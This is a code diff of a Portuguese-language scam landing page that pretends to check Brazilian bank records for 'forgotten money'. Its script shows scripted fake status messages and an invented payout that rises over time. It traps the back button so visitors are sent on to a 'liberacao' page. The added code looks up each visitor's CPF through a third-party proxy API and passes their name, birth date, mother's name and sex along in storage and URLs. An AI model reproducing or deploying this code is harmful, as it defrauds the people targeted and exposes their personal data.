@@ -13,7 +13,6 @@
     <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type">
     <title>Consulta - Video - 2</title>
 
-    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -27,12 +26,10 @@
         }
     </script>
 
-    <!-- fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
-    <!-- REPARO DE QUERY: se a página chegar sem ?utm=..., repõe a query via sessionStorage/referrer (sem recarregar) -->
     <script>
     (function(){
         try {
@@ -49,11 +46,10 @@
                     add.forEach(function(v,k){ if(!cur.has(k)) cur.set(k,v); });
                     if (cur.toString()) {
                         history.replaceState(null, '', location.pathname + '?' + cur.toString() + location.hash);
-                        console.log('[UTM] video: query reparada:', cur.toString());
                     }
                 }
             }
-        } catch(e) { console.warn('[UTM] video: falha ao reparar query:', e); }
+        } catch(e) {}
     })();
     </script>
 
@@ -65,8 +61,6 @@
         .animate-pulse-scale { 
             animation: pulse-scale 1s ease-in-out infinite; 
         }
-        
-        /* Custom Video Player Styles */
         .video-container {
             position: relative;
             width: 100%;
@@ -76,13 +70,11 @@
             overflow: hidden;
             cursor: pointer;
         }
-        
         .video-container video {
             width: 100%;
             height: auto;
             display: block;
         }
-
         .play-pause-btn {
             position: absolute;
             top: 50%;
@@ -101,46 +93,32 @@
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
             z-index: 10;
         }
-
         .play-pause-btn:hover {
             transform: translate(-50%, -50%) scale(1.1);
             background: rgba(255, 255, 255, 1);
             box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
         }
-
         .play-pause-btn:active {
             transform: translate(-50%, -50%) scale(0.95);
         }
-
         .play-pause-btn.playing {
             opacity: 0;
             pointer-events: none;
             transition: opacity 0.3s ease;
         }
-
         .play-pause-btn.show-controls {
             opacity: 0.9;
             pointer-events: auto;
         }
-
         .play-icon,
         .pause-icon {
             width: 30px;
             height: 30px;
             fill: #2563eb;
         }
-
-        .pause-icon {
-            display: none;
-        }
-
-        .play-pause-btn.playing .play-icon {
-            display: none;
-        }
-
-        .play-pause-btn.playing .pause-icon {
-            display: block;
-        }
+        .pause-icon { display: none; }
+        .play-pause-btn.playing .play-icon { display: none; }
+        .play-pause-btn.playing .pause-icon { display: block; }
     </style>
 </head>
 <body class="w-full overflow-x-hidden font-poppins">
@@ -160,7 +138,7 @@
                         </div>
                         <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
                             <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg>
-                            <span class="font-medium" id="nameHeader"></span>
+                            <span class="font-medium" id="nameHeader">Carregando...</span>
                         </button>
                     </div>
                 </div>
@@ -172,14 +150,13 @@
         <main class="px-1 py-4 md:flex md:justify-center md:items-start md:pt-8">
             <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-4 mx-1 md:max-w-4xl w-full">
                 <div class="text-center mb-6">
-                    <h1 class="text-2xl font-bold text-gray-800 mb-2">Consultando dados de <span id="nameUser2"></span></h1>
+                    <h1 class="text-2xl font-bold text-gray-800 mb-2">Consultando dados de <span id="nameUser2">...</span></h1>
                     <p class="text-gray-600">Aguarde enquanto verificamos suas informações no sistema</p>
-                    <p class="text-sm text-gray-500 mt-1">CPF: <span id="cpfUser"></span></p>
+                    <p class="text-sm text-gray-500 mt-1">CPF: <span id="cpfUser">...</span></p>
                 </div>
 
                 <div class="mb-4 sm:mb-6">
                     <div class="relative w-full max-w-xl mx-auto">
-                        <!-- Custom Video Player -->
                         <div class="video-container">
                             <video id="video-player" src="media/GzK7HVG9yLWN.mp4" playsinline="" preload="metadata">
                                 Seu navegador não suporta a reprodução de vídeos.
@@ -244,228 +221,221 @@
     </div>
 
     <script>
-            // ===== BACK REDIRECT =====
-(function() {
-    const redirectUrl = 'liberacao.html';
-    let redirected = false;
+        // ===== BACK REDIRECT =====
+        (function() {
+            const redirectUrl = 'liberacao.html';
+            let redirected = false;
+            function buildRedirectUrl() {
+                const queryString = window.location.search;
+                return queryString ? redirectUrl + queryString : redirectUrl;
+            }
+            history.replaceState({ page: 'trap' }, '', window.location.href);
+            history.pushState({ page: 'current' }, '', window.location.href);
+            window.addEventListener('popstate', function(event) {
+                if (!redirected) { redirected = true; window.location.replace(buildRedirectUrl()); }
+            });
+            window.addEventListener('pageshow', function(event) {
+                if (event.persisted && !redirected) { redirected = true; window.location.replace(buildRedirectUrl()); }
+            });
+        })();
 
-    function buildRedirectUrl() {
-        const queryString = window.location.search;
-        return queryString ? redirectUrl + queryString : redirectUrl;
-    }
-
-    // Substitui o estado atual e empurra um novo em cima
-    history.replaceState({ page: 'trap' }, '', window.location.href);
-    history.pushState({ page: 'current' }, '', window.location.href);
-
-    window.addEventListener('popstate', function(event) {
-        if (!redirected) {
-            redirected = true;
-            window.location.replace(buildRedirectUrl());
+        // ===== HELPERS =====
+        function toTitleCase(str) {
+            if (!str) return '';
+            return str.toLowerCase().replace(/\b\w/g, function(c) { return c.toUpperCase(); });
         }
-    });
 
-    window.addEventListener('pageshow', function(event) {
-        if (event.persisted && !redirected) {
-            redirected = true;
-            window.location.replace(buildRedirectUrl());
+        function formatCPF(cpf) {
+            const n = cpf.replace(/\D/g, '');
+            return n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
         }
-    });
-})();
-// ===== FIM BACK REDIRECT =====
-        // Wait for DOM to be fully loaded
-        document.addEventListener('DOMContentLoaded', () => {
-            // Obter parâmetros da URL (já formatados da página anterior)
+
+        function formatDate(dateStr) {
+            if (!dateStr) return '';
+            let m = dateStr.match(/^(\d{2})[-\/](\d{2})[-\/](\d{4})$/);
+            if (m) return m[1] + '/' + m[2] + '/' + m[3];
+            m = dateStr.match(/(\d{4})[-\/](\d{2})[-\/](\d{2})/);
+            if (m) return m[3] + '/' + m[2] + '/' + m[1];
+            return dateStr.replace(/-/g, '/');
+        }
+
+        // ===== BUSCA DADOS DA API E PREENCHE TELA =====
+        async function fetchAndFill() {
             const urlParams = new URLSearchParams(window.location.search);
-            const nomeUrl = urlParams.get('nome') || '';
-            const cpfUrl = urlParams.get('cpf') || '';
-            
-            // Usar os dados da URL (que já vêm formatados corretamente)
-            // NÃO aplicar nenhuma formatação adicional aqui
-            const nameValue = nomeUrl || localStorage.getItem("name") || "";
-            const cpfValue = cpfUrl || localStorage.getItem('cpf') || '';
-            
-            // Salvar no localStorage para uso posterior (mantendo formato original)
-            if (nomeUrl) localStorage.setItem("name", nomeUrl);
-            if (cpfUrl) localStorage.setItem("cpf", cpfUrl);
-            
-            // Exibir os nomes (sem formatação adicional)
-            const formattedName = nameValue.split(" ")[0];
-            const nameHeader = document.getElementById("nameHeader");
-            const nameUser2 = document.getElementById('nameUser2');
-            
-            if (nameHeader) nameHeader.textContent = formattedName;
-            if (nameUser2) nameUser2.textContent = nameValue;
+            const cpfRaw = (urlParams.get('cpf') || '').replace(/\D/g, '');
 
-            const cpfUser = document.getElementById('cpfUser');
-            if (cpfUser) cpfUser.textContent = cpfValue;
+            // Se a URL já trouxer nome (vindo de outra página), usa direto
+            let nome      = urlParams.get('nome')       || localStorage.getItem('nome') || '';
+            let nascimento= urlParams.get('nascimento') || localStorage.getItem('nascimento') || '';
+            let mae       = urlParams.get('mae')        || localStorage.getItem('mae')  || '';
+            let sexo      = urlParams.get('sexo')       || localStorage.getItem('sexo') || '';
 
-            // Custom Video Player
-            const video = document.getElementById('video-player');
-            const playPauseBtn = document.getElementById('playPauseBtn');
-            const videoContainer = document.querySelector('.video-container');
-
-            if (!video || !playPauseBtn || !videoContainer) {
-                console.error('Video elements not found');
-                return;
+            // Se não tiver nome, consulta a API
+            if (!nome && cpfRaw) {
+                try {
+                    const res  = await fetch('https://proxy-ativo.vercel.app/api/proxy?cpf=' + cpfRaw);
+                    if (res.ok) {
+                        const json = await res.json();
+                        const d    = json.dadosBasicos || {};
+                        nome       = d.nome       ? toTitleCase(d.nome)       : '';
+                        nascimento = d.nascimento ? formatDate(d.nascimento)  : '';
+                        mae        = d.mae        ? toTitleCase(d.mae)        : '';
+                        sexo       = d.sexo === 'M' ? 'Masculino' : d.sexo === 'F' ? 'Feminino' : '';
+                    }
+                } catch(e) {
+                    console.error('Erro ao buscar dados da API:', e);
+                }
             }
 
-            let hasPlayedOnce = false;
+            // Salva tudo no localStorage e na URL para páginas seguintes
+            if (nome)       localStorage.setItem('nome',       nome);
+            if (nascimento) localStorage.setItem('nascimento', nascimento);
+            if (mae)        localStorage.setItem('mae',        mae);
+            if (sexo)       localStorage.setItem('sexo',       sexo);
+            if (cpfRaw)     localStorage.setItem('cpf',        formatCPF(cpfRaw));
 
-            // Handle video errors
+            // Atualiza URL com todos os dados (sem recarregar)
+            const newParams = new URLSearchParams(urlParams.toString());
+            if (nome)       newParams.set('nome',       nome);
+            if (nascimento) newParams.set('nascimento', nascimento);
+            if (mae)        newParams.set('mae',        mae);
+            if (sexo)       newParams.set('sexo',       sexo);
+            if (cpfRaw)     newParams.set('cpf',        formatCPF(cpfRaw));
+            history.replaceState(null, '', location.pathname + '?' + newParams.toString() + location.hash);
+
+            // Preenche os campos na tela
+            const primeiroNome = nome.split(' ')[0];
+            const elNameHeader = document.getElementById('nameHeader');
+            const elNameUser2  = document.getElementById('nameUser2');
+            const elCpfUser    = document.getElementById('cpfUser');
+
+            if (elNameHeader) elNameHeader.textContent = primeiroNome || 'Usuário';
+            if (elNameUser2)  elNameUser2.textContent  = nome || '---';
+            if (elCpfUser)    elCpfUser.textContent    = cpfRaw ? formatCPF(cpfRaw) : '---';
+
+            // Ajusta o link "Continuar com o saque" com todos os params
+            const btnNext = document.getElementById('buttonNext');
+            if (btnNext) {
+                try {
+                    const url = new URL(btnNext.getAttribute('href'), location.href);
+                    const ex  = new URLSearchParams(url.search);
+                    newParams.forEach(function(v, k) { ex.set(k, v); });
+                    url.search = ex.toString() ? ('?' + ex.toString()) : '';
+                    btnNext.setAttribute('href', url.pathname + url.search + url.hash);
+                } catch(e) {}
+            }
+        }
+
+        // ===== PLAYER DE VÍDEO =====
+        document.addEventListener('DOMContentLoaded', function() {
+            // Busca e preenche dados
+            fetchAndFill();
+
+            const video          = document.getElementById('video-player');
+            const playPauseBtn   = document.getElementById('playPauseBtn');
+            const videoContainer = document.querySelector('.video-container');
+
+            if (!video || !playPauseBtn || !videoContainer) return;
+
             video.addEventListener('error', function(e) {
                 console.error('Video error:', e);
-                alert('Erro ao carregar o vídeo. Verifique se o arquivo existe em: media/GzK7HVG9yLWN.mp4');
             });
 
-            // Play/Pause functionality on button click
             playPauseBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 e.stopPropagation();
-                
                 if (video.paused) {
-                    video.play().catch(function(error) {
-                        console.error('Play error:', error);
-                    });
+                    video.play().catch(function(err) { console.error('Play error:', err); });
                 } else {
                     video.pause();
                 }
             });
 
-            // Click on video container to toggle controls
             videoContainer.addEventListener('click', function(e) {
-                // Don't trigger if clicking the button itself
-                if (e.target === playPauseBtn || playPauseBtn.contains(e.target)) {
-                    return;
-                }
-
-                // If video is playing and controls are hidden, show them
+                if (e.target === playPauseBtn || playPauseBtn.contains(e.target)) return;
                 if (!video.paused && !playPauseBtn.classList.contains('show-controls')) {
                     playPauseBtn.classList.add('show-controls');
-                    // Hide controls after 2 seconds
-                    setTimeout(function() {
-                        playPauseBtn.classList.remove('show-controls');
-                    }, 2000);
+                    setTimeout(function() { playPauseBtn.classList.remove('show-controls'); }, 2000);
                 }
             });
 
-            // When video starts playing
-            video.addEventListener('play', function() {
-                hasPlayedOnce = true;
+            video.addEventListener('play',  function() {
                 playPauseBtn.classList.add('playing');
                 playPauseBtn.classList.remove('show-controls');
             });
-
-            // When video pauses
             video.addEventListener('pause', function() {
-                // Always show button when paused
                 playPauseBtn.classList.remove('playing');
                 playPauseBtn.classList.remove('show-controls');
             });
 
-            // Start the main timer
             handleTimer();
         });
 
-        // mensagens animadas
+        // ===== MENSAGENS ANIMADAS =====
         const message = document.getElementById('message');
-        setTimeout(() => { if (message) message.textContent = 'Consultando Caixa Econômica...'; }, 10000);
+        setTimeout(() => { if (message) message.textContent = 'Consultando Caixa Econômica...'; },        10000);
         setTimeout(() => { if (message) message.textContent = 'Consultando registros bancários antigos...'; }, 20000);
-        setTimeout(() => { if (message) message.textContent = 'Verificando histórico de pendências...'; }, 30000);
-        setTimeout(() => { if (message) message.textContent = 'Cruzando dados CPF X Bacen...'; }, 40000);
-        setTimeout(() => { if (message) message.textContent = 'Analisando contas inativas...'; }, 50000);
-        setTimeout(() => { if (message) message.textContent = 'Verificando valores esquecidos...'; }, 60000);
-        setTimeout(() => { if (message) message.textContent = 'Consultando sistema REGISTRATO...'; }, 70000);
-        setTimeout(() => { if (message) message.textContent = 'Validando documentação...'; }, 80000);
-        setTimeout(() => { if (message) message.textContent = 'Finalizando consulta...'; }, 90000);
-        setTimeout(() => { if (message) message.classList.add('hidden'); }, 100000);
+        setTimeout(() => { if (message) message.textContent = 'Verificando histórico de pendências...'; },  30000);
+        setTimeout(() => { if (message) message.textContent = 'Cruzando dados CPF X Bacen...'; },           40000);
+        setTimeout(() => { if (message) message.textContent = 'Analisando contas inativas...'; },           50000);
+        setTimeout(() => { if (message) message.textContent = 'Verificando valores esquecidos...'; },       60000);
+        setTimeout(() => { if (message) message.textContent = 'Consultando sistema REGISTRATO...'; },       70000);
+        setTimeout(() => { if (message) message.textContent = 'Validando documentação...'; },               80000);
+        setTimeout(() => { if (message) message.textContent = 'Finalizando consulta...'; },                 90000);
+        setTimeout(() => { if (message) message.classList.add('hidden'); },                                100000);
 
-        // valores dinâmicos
+        // ===== VALORES DINÂMICOS =====
         const valueToReceive = document.getElementById('valueToReceive');
-        setTimeout(() => { 
-            if (valueToReceive) {
-                valueToReceive.textContent = 'R$1.494,00'; 
-                valueToReceive.classList.remove('text-gray-600');
-                valueToReceive.classList.add('text-green-600');
-            }
-        }, 10000);
+        setTimeout(() => { if (valueToReceive) { valueToReceive.textContent = 'R$1.494,00'; valueToReceive.classList.remove('text-gray-600'); valueToReceive.classList.add('text-green-600'); } }, 10000);
         setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$2.094,00'; }, 20000);
         setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$2.394,00'; }, 30000);
         setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$3.314,00'; }, 50000);
         setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$4.514,00'; }, 70000);
         setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$5.960,00'; }, 90000);
 
-        // barra de progresso
-        const progressBar = document.getElementById('progressBar');
+        // ===== BARRA DE PROGRESSO =====
+        const progressBar  = document.getElementById('progressBar');
         const progressText = document.getElementById('progressText');
-        const duration = 105000; // 105s
+        const duration = 105000;
         const interval = 1000;
-        const steps = duration / interval;
+        const steps    = duration / interval;
         let currentStep = 0;
-        const timer = setInterval(() => {
+        const timerBar = setInterval(() => {
             currentStep++;
-            const progressPercent = Math.min((currentStep / steps) * 100, 100);
-            if (progressBar) progressBar.style.width = `${progressPercent}%`;
-            if (progressText) progressText.textContent = `${Math.floor(progressPercent)}%`;
-            if (currentStep >= steps) clearInterval(timer);
+            const pct = Math.min((currentStep / steps) * 100, 100);
+            if (progressBar)  progressBar.style.width   = `${pct}%`;
+            if (progressText) progressText.textContent  = `${Math.floor(pct)}%`;
+            if (currentStep >= steps) clearInterval(timerBar);
         }, interval);
 
-        // timer principal
+        // ===== TIMER PRINCIPAL =====
         function handleTimer() {
-            let totalSeconds = 105;
-            const timerElement = document.getElementById('timer');
+            let totalSeconds   = 105;
             const buttonElement = document.getElementById('buttonNext');
-            const divElement = document.getElementById('divNext');
-
+            const divElement    = document.getElementById('divNext');
             const countdown = setInterval(() => {
-                const minutes = Math.floor(totalSeconds / 60);
-                const seconds = totalSeconds % 60;
-                if (timerElement) {
-                    timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-                }
                 totalSeconds--;
-                if (totalSeconds < 0) {
+                if (totalSeconds <= 0) {
                     clearInterval(countdown);
-                    if (timerElement) timerElement.textContent = '00:00';
                     if (buttonElement) buttonElement.classList.remove('hidden');
-                    if (divElement) divElement.classList.remove('hidden');
+                    if (divElement)    divElement.classList.remove('hidden');
+                    // Atualiza link do botão com dados mais recentes
+                    fetchAndFill();
                 }
             }, 1000);
         }
 
-        // timer auxiliar (permanece igual)
+        // ===== TIMER AUXILIAR =====
         let tempoRestante = 45 * 60;
-        function timer2() {
-            const minutos = Math.floor(tempoRestante / 60);
-            const segundos = tempoRestante % 60;
+        const intervalo = setInterval(function() {
             const el = document.getElementById('timer2');
-            if (el) el.textContent = `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
+            if (el) {
+                const min = Math.floor(tempoRestante / 60);
+                const seg = tempoRestante % 60;
+                el.textContent = String(min).padStart(2,'0') + ':' + String(seg).padStart(2,'0');
+            }
             if (tempoRestante > 0) tempoRestante--;
-            else {
-                clearInterval(intervalo);
-                if (el) el.textContent = '00:00:00';
-            }
-        }
-        const intervalo = setInterval(timer2, 1000);
+            else clearInterval(intervalo);
+        }, 1000);
     </script>
-
-    <!-- AJUSTE DO LINK "Continuar com o saque" PARA LEVAR OS UTM DA PÁGINA VIDEO -->
-    <script>
-    (function(){
-        try {
-            var a = document.getElementById('buttonNext');
-            if (!a) return;
-            var url = new URL(a.getAttribute('href'), location.href);
-            var cur = new URLSearchParams(location.search);
-            if ([...cur.keys()].length) {
-                var ex = new URLSearchParams(url.search);
-                cur.forEach(function(v,k){ if(!ex.has(k)) ex.set(k,v); });
-                url.search = ex.toString() ? ('?' + ex.toString()) : '';
-                a.setAttribute('href', url.pathname + url.search + url.hash);
-                console.log('[UTM] video: link ajustado ->', a.getAttribute('href'));
-            }
-        } catch(e) { console.warn('[UTM] video: falha ao ajustar link Next:', e); }
-    })();
-    </script>
-
 </body></html>
